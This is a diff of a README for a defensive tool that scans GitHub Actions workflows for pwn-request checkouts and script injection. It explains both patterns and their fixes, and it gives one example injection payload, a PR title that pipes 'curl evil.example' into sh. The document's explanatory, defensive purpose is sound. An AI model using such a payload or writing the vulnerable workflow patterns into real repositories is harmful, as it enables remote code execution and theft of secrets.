@@ -1,49 +1,53 @@
 # Actions Injection Check
 
-A free tool that scans GitHub Actions workflow files for two documented
-injection patterns:
+A free tool that scans GitHub Actions workflow YAML for the two documented
+ways attacker-supplied input reaches privileged execution:
 
-1. **Pwn request checkout** — a `pull_request_target` or `workflow_run`
-   workflow that checks out an untrusted head (`github.event.pull_request.head.sha`,
-   `head.ref`, `github.head_ref`, or the `workflow_run` equivalents), so a
-   later build/test/run step executes a stranger's fork with the base
-   repository's secrets.
+1. **Pwn-request checkout** — a `pull_request_target` or `workflow_run`
+   workflow (which runs with the *base* repo's secrets and a privileged
+   token) that checks out the fork's head, e.g.
+   `ref: ${{ github.event.pull_request.head.sha }}`.
 2. **Script injection** — a `run:` step that interpolates an untrusted
-   `${{ github.event.* }}` expression (a PR title, issue body, commit
-   message, or branch name) straight into a shell command, letting the
-   attacker-controlled string splice its own commands into the script.
+   `${{ github.event.* }}` or `${{ github.head_ref }}` expression directly
+   into a shell command, where the value is spliced into the script text
+   before the shell ever sees it as data.
 
-**What it is not:** a security audit, a compliance attestation, or a
-guarantee that a workflow is safe from injection attacks. It answers one
-narrow question for each finding — does this line match one of two
-well-documented patterns — and it makes no claim about a workflow's overall
-security.
+Both are described in GitHub's own "Security hardening for GitHub Actions"
+guidance. This tool finds them in your files; it does not invent a new
+threat model.
+
+**What it is not:** a security audit, a compliance attestation, or a claim
+that a clean scan means your workflows are safe. It checks two specific
+patterns, and both have variants it does not attempt to catch — a hand-rolled
+`git fetch`/`git checkout` instead of `actions/checkout`, or an expression
+assembled in an unusual way.
 
 ## Why this exists
 
-Both patterns are documented at length in GitHub's own security guidance
-("Keeping your GitHub Actions and workflows secure, Part 1: Preventing pwn
-requests" and "Understanding the risk of script injection"), and the first
-was significant enough that `actions/checkout` v7 (June 2026) started
-refusing the common form of it by default. Plenty of workflows still pin
-older `checkout` versions or route around that default, and script injection
-is unaffected by it entirely — so both patterns are still worth checking for
-directly.
+`pull_request_target` exists so a workflow can comment on, label, or
+otherwise act on a pull request from a fork — which needs write permission
+the fork must not have. The trap is that the workflow *body* still runs from
+the base branch with those permissions, so any step that then builds, tests,
+or otherwise executes the fork's checked-out code hands a stranger the
+repository's secrets. `actions/checkout` v7 (June 2026) began refusing the
+common form by default, which turns "is this me?" into a concrete question a
+maintainer now has to answer across every workflow file they own.
 
-## Why there is no automatic remediation
-
-Privacy-first, on purpose: nothing this tool does ever leaves your device,
-and it makes no network calls of its own. It flags the line and explains the
-fix (move the untrusted value through a step `env:` var and reference it as a
-quoted shell variable; avoid checking out an untrusted head in a privileged
-trigger) — applying that fix is left to you.
+Script injection is the sibling failure and is *not* limited to those two
+triggers: a PR title, an issue body, or a branch name is content a stranger
+fully controls, so `run: echo "${{ github.event.pull_request.title }}"` will
+execute a title of `"; curl evil.example | sh #` as a second command. The fix
+GitHub names — pass the value through a step `env:` var and reference it as a
+quoted shell variable — is what every finding here prints.
 
 ## Try it without installing anything
 
-[`index.html`](index.html) reads the same classification logic in a browser
-page. Paste the contents of one or more files from `.github/workflows/` and
-get every finding, each with its fix — nothing is uploaded, and the page
-itself makes no network requests.
+[`index.html`](index.html) runs the same classification logic as a browser
+page. Paste one or more files from `.github/workflows/` and get every
+finding with its line, the expression involved, and the remediation.
+
+Nothing is uploaded and the page makes no network requests of its own —
+there is no server to send anything to.
 
 ## Quickstart (CLI)
 
@@ -55,28 +59,34 @@ python3 check.py --fail-on-risk   # exit 2 if any finding exists
 ```
 
 Zero dependencies — stdlib only, one file, nothing to install, no network
-calls. Wire `--fail-on-risk` into your own CI to block a newly-added finding
-before it merges.
+calls. Wire `--fail-on-risk` into your own CI to block a newly-added
+pwn-request checkout or interpolated `github.event` expression before it
+merges.
+
+## Background reading
+
+[`what-is-a-pwn-request-in-github-actions.html`](what-is-a-pwn-request-in-github-actions.html)
+explains the pattern, why `pull_request_target` exists at all, and what the
+safe alternative (do the untrusted work in an unprivileged `pull_request`
+workflow, hand off results via artifacts) looks like.
 
 ## Disclaimers
 
-This tool checks for two specific, well-documented injection patterns. It
-does **not** tell you whether a workflow is secure overall, and a clean scan
-is not a security or compliance claim about your repository. Both patterns
-have off-list variants (a hand-rolled `git checkout` instead of
-`actions/checkout`, an expression built with `format()` or string
-concatenation) that this tool does not attempt to catch. Verify its output
-before relying on it, the same as any free, best-effort tool.
+This tool answers two narrow questions about workflow text. It does **not**
+assess your repository's overall security posture, and a clean scan is not a
+security or compliance claim. Verify its output before relying on it, the
+same as any free, best-effort tool.
 
 Optional [GitHub Sponsors](https://github.com/sponsors/Duncan-Haywood)
 never changes what this tool does.
 
 ## Privacy-conscious usage tracking
 
-The browser page counts anonymous feature events in `localStorage` only —
-never transmitted, never tied to a repository, a workflow, or a token. Do Not
-Track and Global Privacy Control are honoured, and a button on the page
-turns it off entirely. The CLI records nothing.
+The browser page counts anonymous feature events (`check_run`,
+`example_loaded`) in `localStorage` only — never transmitted, never tied to a
+repository, a workflow, or a token. Do Not Track and Global Privacy Control
+are honoured, and a button on the page turns it off entirely. The CLI records
+nothing.
 
 ## Development
 
@@ -86,16 +96,14 @@ node --test classify.test.mjs page.test.mjs
 ```
 
 `classify.test.mjs` includes a parity test that shells out to `python3
-check.py` and asserts the browser port produces byte-identical findings on
-the same fixture, so the CLI and the page can never silently disagree about
-what a line means — following `pinned-actions-check/classify.test.mjs`'s
-discipline.
+check.py` and asserts the browser port produces identical findings on the
+same fixture, so the CLI and the page can never silently disagree about what
+a line means.
 
 ## Status
 
 `stage: prototype` in [`VENTURE.yaml`](VENTURE.yaml). Not a scored pipeline
-candidate — like
-[`pinned-actions-check`](../pinned-actions-check/) and
+candidate — like [`pinned-actions-check`](../pinned-actions-check/) and
 [`actions-runner-starvation-check`](../actions-runner-starvation-check/),
 this is a direct graduation of an already-obvious, low-risk dev-tool idea.
 No external user contact has happened yet — that is the next, non-code step
